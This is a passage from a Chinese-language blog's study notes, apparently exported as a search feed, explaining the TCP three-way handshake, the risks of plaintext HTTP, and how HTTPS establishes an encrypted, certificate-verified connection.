color=#DE6B6E>SSL+HTTP协议</font>构建的可加密传输，身份认证的网络协议，虽然建立连接变得复杂但是更加安全，需要多次握手，所以一般会加剧50%时间延迟，且会消耗 CPU 资源，对服务器资源消耗较大</li></ol><h1 id="HTTP和HTTPS建立连接方式"><a href="#HTTP和HTTPS建立连接方式" class="headerlink" title="HTTP和HTTPS建立连接方式"></a>HTTP和HTTPS建立连接方式</h1><h2 id="HTTP建立连接"><a href="#HTTP建立连接" class="headerlink" title="HTTP建立连接"></a>HTTP建立连接</h2><h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p><img src="https://merlynr.github.io/post-images/1592550376754.png"></p><p>==TCP三次握手(Three-way Handshake)==<br>TCP/IP协议是传输层协议，主要解决数据如何在网络中传输，而HTTP是应用层协议，主要解决如何包装数据。“即互联网中TCP/IP就可以满足信息通信，但是想要识别传输的信息是否有意义，我们就需要应用层协议”</p><blockquote><p>  TCP提供的可靠数据传输服务，是依靠接收端TCP软件按序号对收到的数据分组进行逐一确认实现的。这个过程在TCP收发端开始通信时，被称为三次握手初始化。<br>     三次握手的目的是使收发端的数据发送和接收同步，协调可以收发的数据量，建立虚连接。双方的TCP协议软件在交换数据时必须首先建立会话连接，然后才能够以数据分组为单位进行通信。接收端TCP协议软件每收到一个数据分组，在检验传输无误后，就对发送端计算机发送确认信息(ACK，Acknowledgement)，通知该序号分组收到。<br>     数据传输过程中，发送端对已经发出的分组要有记录，并且设置等待确认的计时器，对超过规定时间未收到确认的分组按照丢失重传处理；接收端的TCP协议软件会自动检查是否所有的数据分组都已收到，如果发现哪个数据分组损坏，接收端会将它舍弃，并通知发送端重传；接收端的TCP协议软件还能对未按顺序到达的数据分组进行重新排序，解决乱序问题。<br>     收发端TCP协议软件进行带确认的数据传送过程如所示。在图中，发送端将序号为100的数据分组(SEQ=100)送出；接收端收到后，向发送端回应一个序号为200的分组(SEQ=200)，内容是对收到序号为100的数据分组的确认，确认信息是对收到的数据分组序号加1(ACK=101)；发送端得知序号100的分组收到后，发送下一个数据分组(序号为101， SEQ=101)，并且在该分组中带有对收到序号为200的回应分组的确认(仍然是对收到的分组序号加1，ACK=201)。<br>     最后，当接收端计算机的TCP协议软件确认收到的数据分组无误，就根据封装在分组头部的目的端口号，识别出目的应用程序，将分组中的数据取出并按照原来顺序组合好交付给相应程序。</p><blockquote><p><a href="https://blog.csdn.net/wwj_748/article/details/11855289">FROM:TCP协议的作用？-IT_xiao小巫</a> </p></blockquote></blockquote><ul><li>初始状态：A，B都属于初始状态都是关闭状态</li><li>状态变化：A主动打开连接，B被动打开连接并进入监听状态</li><li>第一次握手：A向B发送一个TCP包，其中包中SYN标志设置为1，表明A向B请求建立连接，并设置序号seq=x，其中x的值表示第一个数据字节序号为x（x不确定，即seq是个随机值）。<br><font color=#DE6B6E>注意：</font>SYN包就是SYN标设为1的TCP包，只有A收到B发来的SYN包，才可以建立连接，否则无法建立连接。因此，<font color=#FAE05C>如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。</font></li><li>状态变化：A进入SYN_SEND状态，等待B的确认</li><li>第二次握手：B如果同意建立连接，会向A发送一个对A发送的SYN包的确认（SYN/ACK）包， 确认号ack=x+1，初始序号seq=y（随机值）<br><font color=#DE6B6E>注意：</font>SYN/ACK包是仅SYN 和 ACK 标记为1的包。这个报文也不能携带数据，但是同样要消耗一个序号。</li><li>状态变化：B进入SYN-RCVD状态（同步收到）</li><li>第三次握手：A收到B的确认TCP报后，向B发送一个确认收到B发送的确认报，其中确认报确认报文段（ACK=1，确认号ack=y+1，序号seq=x+1）</li><li>状态变化：A接到B的确认报文进行检查后变为ESTABLISHED（已建立连接）</li><li>状态变化：当B收到A的确认报文进行检查后变为ESTABLISHED（已建立连接）<br><font color=#DE6B6E>注意：</font>A收到确认后，检查ack是否为x+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=y+1，并且此时操作系统为该TCP连接分配TCP缓存和变量，并将该数据包发送给B，B检查ack是否为y+1，ACK是否为1，如果正确则连接建立成功。</li></ul><blockquote><blockquote><p><a href="https://blog.csdn.net/xingerr/article/details/72834303">FROM：TCP三次握手详解-Shirsen</a><br><a href="https://juejin.im/post/5b1d34eb6fb9a01e7d5c3e25">FROM：注意！是TCP不是HTTP的3次握手与4次挥手-鲍康霖</a></p></blockquote></blockquote><blockquote><p>三次握手的目的是连接服务器指定端口，建立 TCP连接，并同步连接双方的序列号和确认号，交换 TCP窗口大小信息。在 socket 编程中，客户端执行 connect() 时。将触发三次握手。</p></blockquote><h3 id="HTTPS通信中存在问题"><a href="#HTTPS通信中存在问题" class="headerlink" title="HTTPS通信中存在问题"></a>HTTPS通信中存在问题</h3><ol><li>容易被监听<br>http通信都是明文，数据在客户端与服务器通信过程中，任何一点都可能被劫持。比如，发送了银行卡号和密码，hacker劫取到数据，就能看到卡号和密码，这是很危险的</li><li>被伪装<br>http通信时，无法保证通行双方是合法的，通信方可能是伪装的。比如你请求<a href="http://www.taobao.com,你怎么知道返回的数据就是来自淘宝,中间人可能返回数据伪装成淘宝./">www.taobao.com,你怎么知道返回的数据就是来自淘宝，中间人可能返回数据伪装成淘宝。</a></li><li>被篡改<br>hacker中间篡改数据后，接收方并不知道数据已经被更改</li></ol><h2 id="HTTPS连接方式"><a href="#HTTPS连接方式" class="headerlink" title="HTTPS连接方式"></a>HTTPS连接方式</h2><p>==https是http与ssl的结合体==</p><p><img src="https://merlynr.github.io/post-images/1592735988318.png"></p><h3>客户端与服务器获取验证的通信过程</h3><ul><li>客户端发送请求到服务器端</li><li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li><li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li><li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li><li>客户端使用共享密钥解密数据</li><li>SSL加密建立………</li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> summarize </tag>
            
            <tag> Java </tag>
            
            <tag> front-end </tag>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
